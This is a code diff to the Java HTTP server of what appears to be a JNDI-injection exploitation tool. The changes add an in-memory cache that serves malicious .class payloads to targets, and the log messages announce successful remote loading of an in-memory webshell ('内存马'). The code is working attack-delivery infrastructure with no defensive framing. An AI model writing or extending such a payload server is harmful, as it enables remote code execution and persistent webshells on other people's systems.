@@ -36,7 +36,7 @@ public class HTTPServer {
             @Override
             public void handle(HttpExchange httpExchange) {
                 try {
-                    System.out.println(ansi().eraseScreen().render("@|green [+]|@" + " [" + Ltime.getLocalTime() + "]" + " [HTTP] " + getVerse()));
+                    System.out.println(ansi().render("@|green [+]|@" + " [" + Ltime.getLocalTime() + "]" + " [HTTP] " + getVerse()));
                     System.out.println(ansi().render("@|green [+]|@ @|MAGENTA New HTTP Request From >> |@" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
 
                     String path = httpExchange.getRequestURI().getPath();
@@ -427,24 +427,33 @@ public class HTTPServer {
         System.out.println(ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
 
         //先从Cache中加载
-        //找不到就从/org目录下照
-        //String pa   = cwd + File.separator + "org";
-        String pa   = cwd + path;
-        File   file = new File(pa);
+        if (Cache.contains(className)) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
-        if (file.exists()) {
-            byte[] bytes = new byte[(int) file.length()];
-            try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                fileInputStream.read(bytes);
-            }
-            exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
-            exchange.sendResponseHeaders(200, file.length() + 1);
+            byte[] bytes = Cache.get(className);
+            exchange.sendResponseHeaders(200, bytes.length);
+            //这一步返回http请求
             exchange.getResponseBody().write(bytes);
-            System.out.println(ansi().render("@|green [+] 内存马远程类加载成功 |@" + 200));
-        } else {
-            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-            exchange.sendResponseHeaders(404, 0);
+        } else {//找不到就从/org目录下照
+            //String pa   = cwd + File.separator + "org";
+            String pa   = cwd + path;
+            File   file = new File(pa);
+
+            if (file.exists()) {
+                byte[] bytes = new byte[(int) file.length()];
+                try (FileInputStream fileInputStream = new FileInputStream(file)) {
+                    fileInputStream.read(bytes);
+                }
+                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
+                exchange.sendResponseHeaders(200, file.length() + 1);
+                exchange.getResponseBody().write(bytes);
+                System.out.println(ansi().render("@|green [+] 内存马远程类加载成功 |@" + 200));
+            } else {
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
+                exchange.sendResponseHeaders(404, 0);
+            }
         }
+        exchange.close();
     }
 
     private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
